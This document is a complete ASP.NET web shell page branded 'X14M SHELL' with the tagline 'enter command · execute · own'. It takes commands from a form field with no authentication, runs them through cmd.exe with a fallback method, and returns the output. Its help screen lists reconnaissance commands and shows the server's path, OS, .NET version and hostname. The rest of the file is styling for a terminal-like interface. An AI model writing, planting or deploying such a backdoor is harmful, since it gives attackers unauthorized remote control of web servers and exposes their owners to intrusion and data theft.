<%@ Page Language="C#" AutoEventWireup="true" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (IsPostBack)
        {
            string cmd = Request.Form["cmd"];
            if (!string.IsNullOrEmpty(cmd))
            {
                ExecuteCommand(cmd);
            }
        }
        else
        {
            ShowHelp();
        }
    }

    private void ExecuteCommand(string command)
    {
        string output = string.Empty;
        string error = string.Empty;

        try
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            output = process.StandardOutput.ReadToEnd();
            error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            if (string.IsNullOrEmpty(output) && string.IsNullOrEmpty(error))
            {
                output = "Command executed successfully (no output).";
            }
        }
        catch (Exception ex)
        {
            try
            {
                output = ExecuteCommandAlternative(command);
            }
            catch (Exception ex2)
            {
                output = "Primary error: " + ex.Message + "<br/>";
                output += "Fallback error: " + ex2.Message;
            }
        }

        string resultHtml = "<div class='result-container'>";
        resultHtml += "<h3>⏣ OUTPUT</h3>";
        resultHtml += "<div class='command-display'>$ " + Server.HtmlEncode(command) + "</div>";
        resultHtml += "<pre class='output'>" + Server.HtmlEncode(output) + "</pre>";

        if (!string.IsNullOrEmpty(error))
        {
            resultHtml += "<div class='error-output'><strong>⚠ ERROR:</strong><br/>";
            resultHtml += "<pre>" + Server.HtmlEncode(error) + "</pre></div>";
        }

        resultHtml += "</div>";
        lblOutput.Text = resultHtml;
    }

    private string ExecuteCommandAlternative(string command)
    {
        StringBuilder output = new StringBuilder();

        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + command;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        using (Process proc = Process.Start(psi))
        {
            output.Append(proc.StandardOutput.ReadToEnd());
            output.Append(proc.StandardError.ReadToEnd());
            proc.WaitForExit();
        }

        return output.ToString();
    }

    private void ShowHelp()
    {
        string helpHtml = @"
            <div class='help-container'>
                <h2>⧩ X14M SHELL</h2>
                <p class='subtitle'>enter command · execute · own</p>
                
                <div class='examples'>
                    <h4>⤷ examples</h4>
                    <ul>
                        <li><code>whoami</code> · current user</li>
                        <li><code>dir C:\</code> · root dir</li>
                        <li><code>ipconfig</code> · network</li>
                        <li><code>systeminfo</code> · system</li>
                        <li><code>tasklist</code> · processes</li>
                    </ul>
                </div>
                
                <div class='system-info'>
                    <h4>⤷ system</h4>
                    <ul>
                        <li><strong>path:</strong> " + Server.MapPath("~") + @"</li>
                        <li><strong>.NET:</strong> " + Environment.Version + @"</li>
                        <li><strong>OS:</strong> " + Environment.OSVersion + @"</li>
                        <li><strong>host:</strong> " + Environment.MachineName + @"</li>
                    </ul>
                </div>
            </div>
        ";

        lblOutput.Text = helpHtml;
    }
</script>

<!DOCTYPE html>
<html>
<head runat="server">
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>X14M · shell</title>
    <style>
        /* ——— RESET ——— */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0b0e14;
            color: #b7c9d6;
            font-family: 'Iosevka', 'Consolas', 'Monaco', monospace;
            padding: 18px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            max-width: 1000px;
            width: 100%;
            background: #0f131c;
            border-radius: 20px;
            padding: 28px 32px 36px;
            border: 1px solid #1e2a3a;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.8), inset 0 0 0 1px rgba(255, 255, 255, 0.02);
        }

        /* ——— HEADER (no logo, no S14M) ——— */
        .header {
            display: flex;
            align-items: baseline;
            justify-content: space-between;
            flex-wrap: wrap;
            margin-bottom: 28px;
            padding-bottom: 14px;
            border-bottom: 1px solid #1a2636;
        }

        .header h1 {
            font-size: 1.9rem;
            font-weight: 500;
            letter-spacing: -0.5px;
            background: linear-gradient(130deg, #8bb8e0, #b0d0f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px rgba(70, 130, 200, 0.15);
        }

        .header .badge {
            font-size: 0.6rem;
            font-weight: 400;
            color: #4d6a8f;
            background: #141e2b;
            padding: 4px 14px;
            border-radius: 30px;
            border: 1px solid #253544;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }

        /* ——— FORM ——— */
        .command-form {
            display: flex;
            flex-wrap: wrap;
            gap: 14px;
            margin-bottom: 30px;
            align-items: center;
        }

        .command-form .input-group {
            flex: 2 1 280px;
            display: flex;
            border: 1px solid #1e2a3a;
            border-radius: 12px;
            background: #0a0e16;
            transition: border 0.2s, box-shadow 0.2s;
            overflow: hidden;
        }

        .command-form .input-group:focus-within {
            border-color: #6a8fc0;
            box-shadow: 0 0 0 3px rgba(80, 140, 220, 0.2);
        }

        .command-form .input-group .prompt {
            background: #0f1621;
            color: #45607a;
            padding: 12px 16px;
            font-family: 'Iosevka', 'Consolas', monospace;
            font-weight: 400;
            font-size: 0.85rem;
            border-right: 1px solid #1a2636;
            user-select: none;
            letter-spacing: 0.5px;
        }

        .command-form .input-group input[type="text"] {
            flex: 1;
            padding: 12px 18px;
            border: none;
            background: transparent;
            color: #d4e2f0;
            font-family: 'Iosevka', 'Consolas', monospace;
            font-size: 0.95rem;
            outline: none;
            min-width: 100px;
        }

        .command-form .input-group input[type="text"]::placeholder {
            color: #2c3d52;
            font-weight: 300;
        }

        .command-form .btn-execute {
            background: #1f2d3f;
            color: #b7d0ea;
            border: 1px solid #2f4058;
            padding: 12px 32px;
            border-radius: 12px;
            font-weight: 500;
            font-size: 0.9rem;
            font-family: 'Iosevka', 'Consolas', monospace;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            gap: 10px;
            letter-spacing: 0.5px;
            background: #141e2b;
            box-shadow: 0 2px 0 #0a101a;
        }

        .command-form .btn-execute:hover {
            background: #1f3147;
            border-color: #4a6f96;
            color: #daeafc;
            box-shadow: 0 0 20px rgba(60, 120, 200, 0.25);
        }

        .command-form .btn-execute:active {
            transform: scale(0.96);
            box-shadow: 0 0 10px rgba(60, 120, 200, 0.15);
        }

        /* ——— OUTPUT ——— */
        .result-container {
            margin-top: 6px;
            animation: fadeIn 0.25s ease;
        }

        .result-container h3 {
            font-weight: 400;
            font-size: 0.8rem;
            color: #4d6a8a;
            letter-spacing: 2px;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        .command-display {
            background: #0a0f18;
            padding: 10px 18px;
            border-radius: 10px 10px 0 0;
            font-family: 'Iosevka', 'Consolas', monospace;
            font-size: 0.85rem;
            color: #7ca0c9;
            border: 1px solid #1a2636;
            border-bottom: none;
            word-break: break-all;
        }

        .output {
            background: #090d14;
            padding: 18px 22px;
            border-radius: 0 0 12px 12px;
            border: 1px solid #1a2636;
            border-top: none;
            font-family: 'Iosevka', 'Consolas', monospace;
            font-size: 0.85rem;
            line-height: 1.7;
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 480px;
            overflow-y: auto;
            color: #c9dcee;
        }

        .error-output {
            margin-top: 16px;
            padding: 12px 18px;
            background: #1c1622;
            border-left: 4px solid #b34a4a;
            border-radius: 8px;
            color: #ddb3b3;
        }

        .error-output pre {
            background: transparent;
            padding: 6px 0 0 0;
            border: none;
            color: #ddb3b3;
            font-family: 'Iosevka', 'Consolas', monospace;
            font-size: 0.8rem;
            white-space: pre-wrap;
        }

        /* ——— HELP ——— */
        .help-container {
            animation: fadeIn 0.3s ease;
        }

        .help-container h2 {
            font-size: 2.2rem;
            font-weight: 400;
            letter-spacing: -1px;
            background: linear-gradient(135deg, #8bb8e0, #b8d4f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 2px;
        }

        .help-container .subtitle {
            color: #3d5775;
            font-size: 0.85rem;
            margin-bottom: 28px;
            letter-spacing: 2px;
            text-transform: lowercase;
        }

        .help-container .examples,
        .help-container .system-info {
            background: #0b111b;
            border-radius: 14px;
            padding: 18px 24px;
            margin-bottom: 18px;
            border: 1px solid #1a2636;
        }

        .help-container h4 {
            color: #6f92b8;
            font-weight: 400;
            letter-spacing: 2px;
            font-size: 0.75rem;
            text-transform: uppercase;
            margin-bottom: 12px;
        }

        .help-container ul {
            list-style: none;
            padding: 0;
            display: flex;
            flex-wrap: wrap;
            gap: 6px 24px;
        }

        .help-container ul li {
            font-size: 0.9rem;
            color: #b7c9d6;
            letter-spacing: 0.2px;
        }

        .help-container ul li code {
            background: #121c2a;
            padding: 2px 12px;
            border-radius: 6px;
            font-family: 'Iosevka', 'Consolas', monospace;
            font-size: 0.8rem;
            color: #8bb8e0;
            border: 1px solid #1e2a3a;
        }

        .help-container .system-info ul {
            display: block;
        }

        .help-container .system-info ul li {
            padding: 4px 0;
            font-size: 0.85rem;
            color: #b0c7dc;
        }

        .help-container .system-info ul li strong {
            color: #5d7f9e;
            font-weight: 400;
            display: inline-block;
            min-width: 80px;
            letter-spacing: 0.5px;
        }

        /* ——— SCROLL ——— */
        .output::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        .output::-webkit-scrollbar-track {
            background: #080c14;
        }

        .output::-webkit-scrollbar-thumb {
            background: #1e2a3a;
            border-radius: 10px;
        }

        .output::-webkit-scrollbar-thumb:hover {
            background: #2f4058;
        }

        /* ——— RESPONSIVE ——— */
        @media (max-width: 700px) {
            body {
                padding: 12px;
            }
            .container {
                padding: 20px 16px 28px;
            }
            .header h1 {
                font-size: 1.5rem;
            }
            .header .badge {
                font-size: 0.5rem;
                padding: 2px 10px;
            }
            .command-form .input-group {
                flex: 1 1 100%;
            }
            .command-form .btn-execute {
                width: 100%;
                justify-content: center;
                padding: 14px;
            }
            .output {
                font-size: 0.8rem;
                padding: 14px 16px;
                max-height: 320px;
            }
            .help-container h2 {
                font-size: 1.7rem;
            }
            .help-container ul {
                flex-direction: column;
                gap: 4px;
            }
            .help-container .system-info ul li strong {
                min-width: 70px;
            }
        }

        @media (max-width: 420px) {
            .header {
                flex-direction: column;
                align-items: flex-start;
                gap: 6px;
            }
            .header h1 {
                font-size: 1.3rem;
            }
            .command-form .input-group .prompt {
                padding: 10px 12px;
                font-size: 0.75rem;
            }
            .output {
                font-size: 0.7rem;
                padding: 12px;
                max-height: 240px;
            }
        }

        /* ——— ANIMATION ——— */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(6px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* mac-style subtle glow */
        .container {
            backdrop-filter: blur(1px);
        }
        .command-form .input-group input[type="text"]::selection {
            background: #2f4058;
            color: #d4e2f0;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <div class="container">
            <!-- HEADER · no logo · no S14M_69 -->
            <div class="header">
                <h1>⏣ X14M</h1>
                <span class="badge">● shell</span>
            </div>

            <!-- COMMAND FORM -->
            <div class="command-form">
                <div class="input-group">
                    <span class="prompt">⤷</span>
                    <asp:TextBox ID="txtCommand" runat="server" placeholder="enter command ..." />
                </div>
                <asp:Button ID="btnExecute" runat="server" Text="⏎ execute" CssClass="btn-execute" OnClick="ExecuteCommand_Click" />
            </div>

            <!-- OUTPUT -->
            <asp:Label ID="lblOutput" runat="server" />
        </div>
    </form>

    <script runat="server">
        protected void ExecuteCommand_Click(object sender, EventArgs e)
        {
            string cmd = txtCommand.Text.Trim();
            if (!string.IsNullOrEmpty(cmd))
            {
                ExecuteCommand(cmd);
            }
            else
            {
                lblOutput.Text = "<div class='result-container' style='color:#8b7a6a;'>⏎ enter a command.</div>";
            }
        }
    </script>
</body>
</html>